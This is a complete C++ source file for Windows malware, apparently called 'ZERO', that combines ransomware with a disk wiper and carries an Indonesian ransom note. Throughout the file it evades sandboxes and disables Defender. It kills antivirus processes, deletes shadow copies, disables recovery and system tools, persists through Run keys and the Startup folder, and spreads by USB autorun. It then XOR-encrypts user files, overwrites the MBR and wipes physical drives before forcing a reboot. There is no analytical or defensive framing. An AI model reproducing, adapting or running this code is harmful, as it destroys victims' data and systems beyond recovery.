#include <windows.h>
#include <winioctl.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <cstring>
#include <urlmon.h>
#include <tlhelp32.h>

#pragma comment(lib, "urlmon.lib")

namespace fs = std::filesystem;

const char* XOR_KEY = "ZEROKEY2026";
const char* RANSOM_EXT = ".zero";

// ---------- ANTI-VM ----------
bool isSandbox() {
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    int c = 0;
    if (Process32First(hSnap, &pe)) do { c++; } while (Process32Next(hSnap, &pe));
    CloseHandle(hSnap);
    return c < 30;
}

// ---------- PRIVILEGE ----------
void enablePrivileges() {
    HANDLE hToken; TOKEN_PRIVILEGES tp; LUID luid;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
        tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }
}

// ---------- DISABLE DEFENDER ----------
void disableDefender() {
    HKEY hKey; DWORD v = 1;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(hKey);

    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" >nul 2>&1");
    system("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\" >nul 2>&1");
    system("vssadmin delete shadows /all /quiet >nul 2>&1");
    system("wmic shadowcopy delete /nointeractive >nul 2>&1");
    system("bcdedit /set {default} recoveryenabled No >nul 2>&1");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1");
    system("netsh advfirewall set allprofiles state off >nul 2>&1");
}

// ---------- KILL AV ----------
void killAV() {
    const char* t[] = {"MsMpEng.exe","NisSrv.exe","MpCmdRun.exe","avp.exe",
        "avast.exe","avgnt.exe","mcshield.exe","bdagent.exe",
        "MBAMService.exe","SophosAgent.exe","ekrn.exe","egui.exe",
        "vptray.exe","rtvscan.exe","SEDService.exe","ccSvcHst.exe",nullptr};
    for (int i = 0; t[i]; i++) {
        std::string c = "taskkill /F /IM " + std::string(t[i]) + " >nul 2>&1";
        system(c.c_str());
    }
}

// ---------- DISABLE TOOLS ----------
void disableTools() {
    HKEY hKey; DWORD v = 1;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegSetValueExA(hKey, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegSetValueExA(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(hKey);
}

// ---------- MBR OVERWRITE ----------
void overwriteMBR() {
    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    unsigned char mbr[512]; memset(mbr, 0, 512);
    const char* msg = "SISTEM ANDA TELAH DIHANCURKAN ZERO";
    memcpy(mbr, msg, strlen(msg));
    mbr[510] = 0x55; mbr[511] = 0xAA;
    DWORD w; SetFilePointer(h, 0, NULL, FILE_BEGIN);
    WriteFile(h, mbr, 512, &w, NULL);
    CloseHandle(h);
}

// ---------- ENCRYPT ----------
void xorEnc(char* d, size_t l) {
    size_t k = strlen(XOR_KEY);
    for (size_t i = 0; i < l; i++) d[i] ^= XOR_KEY[i % k];
}

void encFile(const std::string& p) {
    std::ifstream in(p, std::ios::binary);
    if (!in.is_open()) return;
    std::vector<char> d((std::istreambuf_iterator<char>(in)),
                        std::istreambuf_iterator<char>());
    in.close();
    if (d.empty()) return;
    xorEnc(d.data(), d.size());
    std::ofstream out(p, std::ios::binary | std::ios::trunc);
    out.write(d.data(), d.size());
    out.close();
    try { fs::rename(p, p + RANSOM_EXT); } catch (...) {}
}

void walkEnc(const std::string& dir) {
    try {
        for (auto& e : fs::recursive_directory_iterator(dir,
                fs::directory_options::skip_permission_denied)) {
            if (e.is_regular_file()) {
                std::string x = e.path().extension().string();
                if (x == ".exe" || x == ".dll" || x == ".sys") continue;
                encFile(e.path().string());
            }
        }
    } catch (...) {}
}

void runRansomware() {
    const char* t[] = {"C:\\Users","C:\\ProgramData","C:\\Windows\\Temp",
                       "D:\\","E:\\","F:\\","G:\\",nullptr};
    for (int i = 0; t[i]; i++) walkEnc(t[i]);
}

// ---------- WIPE DISK ----------
void wipeDisk(const char* d) {
    HANDLE h = CreateFileA(d, GENERIC_WRITE, FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    char b[4096]; memset(b, 0xFF, 4096);
    DWORD w;
    for (int i = 0; i < 25600; i++) WriteFile(h, b, 4096, &w, NULL);
    CloseHandle(h);
}

void runWiper() {
    wipeDisk("\\\\.\\PhysicalDrive0");
    wipeDisk("\\\\.\\PhysicalDrive1");
    wipeDisk("\\\\.\\PhysicalDrive2");
    wipeDisk("\\\\.\\PhysicalDrive3");
}

// ---------- PERSISTENCE ----------
void installPersist() {
    char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, MAX_PATH);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "WinSecUpdate", 0, REG_SZ, (BYTE*)exe, strlen(exe) + 1);
    RegCloseKey(hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "WinSecUpdate", 0, REG_SZ, (BYTE*)exe, strlen(exe) + 1);
    RegCloseKey(hKey);

    char appd[MAX_PATH]; GetEnvironmentVariableA("APPDATA", appd, MAX_PATH);
    std::string s = std::string(appd) +
        "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe";
    CopyFileA(exe, s.c_str(), FALSE);
}

// ---------- USB SPREAD ----------
void spreadUSB() {
    char d[256]; GetLogicalDriveStringsA(256, d);
    char* p = d;
    while (*p) {
        if (GetDriveTypeA(p) == DRIVE_REMOVABLE) {
            char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, MAX_PATH);
            std::string dst = std::string(p) + "svchost.exe";
            CopyFileA(exe, dst.c_str(), FALSE);
            std::string au = std::string(p) + "autorun.inf";
            std::ofstream f(au);
            f << "[AutoRun]\nOpen=svchost.exe\nAction=Open folder\n";
            f.close();
            SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            SetFileAttributesA(au.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
        p += strlen(p) + 1;
    }
}

// ---------- RANSOM NOTE ----------
void showNote() {
    std::ofstream f("C:\\Users\\Public\\Desktop\\BACA_INI.txt");
    f << "====================================\n";
    f << "   SISTEM ANDA TELAH DIHANCURKAN\n";
    f << "====================================\n\n";
    f << "Semua file telah dienkripsi.\n";
    f << "MBR telah ditimpa.\n";
    f << "Hardisk rusak permanen.\n\n";
    f << "Tidak ada recovery.\nTidak ada backup.\n\n";
    f << "         - ZERO -\n";
    f.close();
    system("notepad C:\\Users\\Public\\Desktop\\BACA_INI.txt");
}

// ---------- SELF DESTRUCT ----------
void selfDestruct() {
    char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, MAX_PATH);
    std::string c = "cmd /c timeout /t 3 & del /f /q \"" +
                    std::string(exe) + "\" & del /f /q \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe\"";
    system(c.c_str());
}

// ---------- MAIN ----------
int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (isSandbox()) return 0;
    Sleep(30000);

    enablePrivileges();
    disableDefender();
    killAV();
    disableTools();
    installPersist();
    spreadUSB();
    runRansomware();
    overwriteMBR();
    runWiper();
    showNote();
    selfDestruct();
    system("shutdown /r /f /t 0");
    return 0;
}
